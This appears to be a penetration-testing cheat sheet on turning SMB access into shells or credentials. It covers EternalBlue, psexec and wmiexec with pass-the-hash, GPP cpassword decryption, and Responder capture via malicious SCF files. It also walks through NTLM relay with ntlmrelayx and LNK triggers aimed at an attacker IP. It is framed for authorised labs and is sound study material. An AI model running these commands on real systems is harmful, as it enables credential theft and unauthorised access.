## Goal
Convert SMB access into a shell or creds: known vulns, credential shells, GPP passwords, capture, and SMB NTLM relay.

**Checklist**
- [ ] MS17-010 vulnerable? -> EternalBlue
- [ ] admin creds/hash? -> psexec/wmiexec
- [ ] SYSVOL Groups.xml (GPP cpassword)?
- [ ] writable share + Windows victims? -> capture or relay
- [ ] distinct target with signing disabled? -> SMB NTLM relay

# Commands

### EternalBlue (MS17-010)
```bash
nmap -p445 --script smb-vuln-ms17-010 $IP
# metasploit: exploit/windows/smb/ms17_010_eternalblue
# or the AutoBlue manual PoC if MSF isn't allowed
```

### Shell with creds / hash (psexec family)
```bash
impacket-psexec <domain>/<user>:'<pass>'@$IP           # SYSTEM shell (needs admin)
impacket-wmiexec <domain>/<user>:'<pass>'@$IP          # quieter
impacket-psexec <domain>/<user>@$IP -hashes :<NTLM>    # pass-the-hash
```

### GPP cpassword (SYSVOL / a share)
```bash
# find Groups.xml, then decrypt (AES key is public):
gpp-decrypt <cpassword_string>          # -> plaintext domain password
```

### SCF + Responder (writable share -> challenge-response capture)
```bash
sudo responder -I tun0
# drop a malicious @something.scf in a writable share; browsing users leak NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Captured NetNTLMv2 is a network challenge-response, not the account's NTLM hash. Crack it offline or relay the live authentication. Do not pass it to `-H`.

### SMB NTLM relay: signing disabled

Search aliases: NTLM relay, `ntlmrelayx`, SMB signing, relay list, SCF, URL, LNK, `slinky`.

Goal: coerce one lab client to authenticate to you, then relay that live authentication to a different SMB target that does not require signing.

**Checklist**
- [ ] source/trigger host and relay target are different systems
- [ ] target SMB signing is disabled
- [ ] victim can reach `<attacker_ip>:445`
- [ ] target accepts NTLM and is reachable from the attacker
- [ ] TCP 445 is free for `ntlmrelayx`
- [ ] one writable share is proven for the trigger
- [ ] relayed identity is plausibly local administrator for the default SAM dump or command execution
- [ ] cleanup command is ready

**Step 1: Build the target list**

```bash
nxc smb <target_range_or_file> -u <user> -p '<password>' --gen-relay-list relay_targets.txt
```

Keep only authorised, reachable targets. `signing:False` makes relay possible; it does not guarantee the relayed identity has useful rights.

**Step 2: Start the relay listener**

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -tf relay_targets.txt
```

`ntlmrelayx` owns TCP 445. Do not run Responder's SMB server at the same time. The default SMB relay action attempts credential material; add a specific `ntlmrelayx` action only when the objective requires it.

**Step 3: Place one trigger**

Use NetExec `slinky` against only the intended writable share:

```bash
nxc smb <share_host> -u <user> -p '<password>' -M slinky -o SERVER=<attacker_ip> NAME=<trigger_name> SHARES=<share_name>
```

Wait for an authorised user or machine to browse the share. Do not scatter triggers across shares.

**Verify and interpret**

| Result | Meaning | Next |
| --- | --- | --- |
| No inbound authentication | No target authentication | Re-check trigger, victim-to-listener reachability, listener IP, and routing |
| Authentication failed or relay rejected | No target authentication | Check identity, signing, NTLM policy, and target; stop rather than retry blindly |
| Authenticated, no privileged action | SMB service authentication only | Record source identity and target; enumerate permitted SMB actions |
| Local SAM dumped | Local hashes for that relay target | Use [[03_credential_access]] local/domain-context rules |
| Command executed | Host execution as the reported identity | Use the [[00_AD_METHODOLOGY#Step 6: New Windows shell: low privilege or already local Administrator/SYSTEM?\|new-Windows-shell router]] |

Successful trigger placement is not relay success. Successful relay authentication is not automatically administrator or code execution.

**Cleanup**

```bash
nxc smb <share_host> -u <user> -p '<password>' -M slinky -o NAME=<trigger_name> SHARES=<share_name> CLEANUP=True
```

Confirm the `.lnk` is gone and stop the listener. Route unrelayed NetNTLM to the [[artifact_triage|cracking workflow]], recovered credentials through [[01_credentials_and_spraying]], and confirmed execution through [[00_FOOTHOLD]]. Record source identity, relay target, and exact successful action.

### Helpline
```bash
# WHICH SHELL: psexec/smbexec = SYSTEM but noisy (drops a service); wmiexec/atexec = quieter, user-context.
# MS17-010 = unpatched Win7/2008-era only; nmap smb-vuln-ms17-010 confirms BEFORE you fire EternalBlue.
# GPP: any Groups.xml in SYSVOL carries an AES 'cpassword' with a PUBLIC key -> gpp-decrypt = plaintext.
# SCF/Responder: needs a WRITABLE share users browse; the .scf forces their host to authenticate to you.
# captured NetNTLMv2 -> crack with hashcat -m 5600; live authentication -> relay only when target signing is OFF.
```

In a domain, a SYSTEM/admin shell here is a **credential-harvest** opportunity (local SAM/LSA/LSASS, and NTDS/DCSync on a DC) → [[03_credential_access]]; then reuse and re-enumerate via [[00_AD_METHODOLOGY]]; AD service index → [[00_AD_SERVICES]].
